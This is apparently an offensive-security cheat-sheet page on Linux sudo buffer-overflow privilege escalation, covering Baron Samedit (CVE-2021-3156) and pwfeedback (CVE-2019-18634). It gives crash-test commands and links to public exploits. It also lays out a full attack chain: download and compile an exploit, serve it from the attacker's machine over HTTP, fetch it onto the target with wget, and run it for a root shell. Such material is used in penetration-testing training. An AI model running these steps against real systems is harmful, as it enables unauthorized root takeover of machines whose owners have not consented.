# Buffer Overflow Privilege Escalation

Buffer overflow in Linux might be vulnerable to privilege escalation (PrivEsc).

### Baron Samedit (Heap Buffer Overflow) CVE-2021-3156 <a href="#baron-samedit-heap-buffer-overflow-cve-2021-3156" id="baron-samedit-heap-buffer-overflow-cve-2021-3156"></a>

#### 1. Check Vulnerability to Overwrite Heap Buffer in Target Machine <a href="#id-1-check-vulnerability-to-overwrite-heap-buffer-in-target-machine" id="id-1-check-vulnerability-to-overwrite-heap-buffer-in-target-machine"></a>

```shellscript
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
malloc(): invalid size (unsorted)
Aborted
```

#### 2. Proof of Concept <a href="#id-2-proof-of-concept" id="id-2-proof-of-concept"></a>

There are various PoC online.

* [https://github.com/lockedbyte/CVE-Exploits/tree/master/CVE-2021-3156](https://github.com/lockedbyte/CVE-Exploits/tree/master/CVE-2021-3156).
* [https://github.com/blasty/CVE-2021-3156](https://github.com/blasty/CVE-2021-3156)

### Pwfeedback <a href="#pwfeedback" id="pwfeedback"></a>

#### 1. Check Enabling the Pwfeedback in /etc/sudoers <a href="#id-1-check-enabling-the-pwfeedback-in-etcsudoers" id="id-1-check-enabling-the-pwfeedback-in-etcsudoers"></a>

If so, when running sudo command and inputting password, asterisk will be displayed.\
You can make it the buffer overflow.

```shellscript
cat /etc/sudoers

# -------------------------------------------

...
Defaults pwfeadback
...
```

#### 2. Input Long String to Password <a href="#id-2-input-long-string-to-password" id="id-2-input-long-string-to-password"></a>

```
perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id
# [sudo] password: Segmentation fault
```

#### 3. Download a Payload and Compile in Local Machine <a href="#id-3-download-a-payload-and-compile-in-local-machine" id="id-3-download-a-payload-and-compile-in-local-machine"></a>

```
wget https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.c
gcc -o exploit exploit.c
```

#### 4. Transfer the Payload to Remote Machine <a href="#id-4-transfer-the-payload-to-remote-machine" id="id-4-transfer-the-payload-to-remote-machine"></a>

```shellscript
# In local machine
python3 -m http.server 8000

# In remote machine
wget http://<local-ip>:8000/exploit
```

#### 5. Execute the Payload in Remote Machine <a href="#id-5-execute-the-payload-in-remote-machine" id="id-5-execute-the-payload-in-remote-machine"></a>

After that, you'll get a root shell.

```shellscript
chmod 700 ./exploit
./exploit
```
